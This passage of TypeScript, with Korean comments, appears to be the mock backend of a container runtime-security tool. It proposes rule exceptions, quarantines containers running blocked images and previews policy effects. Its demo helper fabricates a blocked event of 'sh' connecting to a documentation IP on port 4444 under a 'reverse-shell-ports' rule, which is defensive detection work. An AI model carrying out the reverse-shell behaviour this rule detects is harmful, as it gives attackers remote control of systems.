        // 10/30: dns 규칙은 허용 도메인 목록이 있을 때만 예외(없는 규칙에 첫 allowHosts 를 넣으면 허용 목록 모드로 바뀐다)
        else if (v.event.kind === 'dns' && v.event.dstHost && hadHosts.has(v.ruleId)) add({ op: 'except', ruleId: v.ruleId, field: 'allowHosts', value: v.event.dstHost });
        else if (v.event.kind === 'dns') note(`규칙 ${v.ruleId} 은 허용 도메인 목록이 없어 자동 예외를 만들지 않습니다 — 정책 탭에서 직접 수정하세요`);
        else if (v.event.kind === 'connect' && v.event.dstHost && hadHosts.has(v.ruleId)) add({ op: 'except', ruleId: v.ruleId, field: 'allowHosts', value: v.event.dstHost });
        else if (v.event.kind === 'connect') add({ op: 'except', ruleId: v.ruleId, field: 'allowCidrs', value: `${v.event.dstIp}/32` });
      }
    }
    return { changes: out, notes };
  }

  // 런타임: 컨테이너가 다시 떴는데 이미지가 차단 목록에 있으면 시작 즉시 격리(blocked-image) — 새 건은 열지 않는다
  runtimeKill(container: string, image: string) {
    const b = this.blocklist.images.find((e) => e.value === image);
    if (!b) throw new Error(`차단 목록에 없는 이미지 ${image}`);
    const v: Verdict = { ...kill(ev(Date.now(), 0, container, image, { kind: 'exec', comm: 'python' }), 'blocked-image', `차단된 이미지 ${image}`) };
    this.recent.unshift(v);
    this.audit.unshift({ ...v, id: Math.max(0, ...this.audit.map((a) => a.id)) + 1, caseId: b.caseId ?? null, install: null });
    this.send({ type: 'verdict', data: v });
  }

  private preview(p: Proposal): Preview {
    const changed: Preview['changed'] = [];
    for (const a of this.audit) {
      const before = levelOf(a);
      for (const ch of p.changes) {
        if (ch.op === 'except' && a.ruleId === ch.ruleId && (a.event.dstHost === ch.value || a.event.path === ch.value || `${a.event.dstIp}/32` === ch.value)) {
          changed.push({ auditId: a.id, before, after: 'normal', container: a.event.containerName, ruleId: a.ruleId! });
        }
        if (ch.op === 'block' && ch.list === 'hosts' && a.event.dstHost === ch.value && before !== 'killed') {
          changed.push({ auditId: a.id, before, after: 'killed', container: a.event.containerName, ruleId: 'blocklist-hosts' });
        }
      }
    }
    const nextOnly = p.changes.flatMap((ch) => (ch.op === 'block' && ch.list !== 'hosts' ? [{ list: ch.list, value: ch.value }] : []));
    return { evaluated: this.audit.length, changed, nextOnly, counts: { toNormal: changed.filter((c) => c.after === 'normal').length, toBlocked: changed.filter((c) => c.after !== 'normal').length } };
  }
}

// WS 로 보낼 격리 판정(같은 컨테이너 연속 격리 → 토스트 묶음 확인용)
export function killedVerdict(container: string, reason = '리버스 셸 포트 4444'): Verdict {
  return kill(ev(Date.now(), 0, container, 'demo/x:1', { kind: 'connect', comm: 'sh', dstIp: '203.0.113.7', dstPort: 4444 }), 'reverse-shell-ports', reason);
}
export function normalVerdict(container: string, path: string): Verdict {
  return ok(ev(Date.now(), 0, container, 'demo/x:1', { kind: 'open', comm: 'python', path }));
}
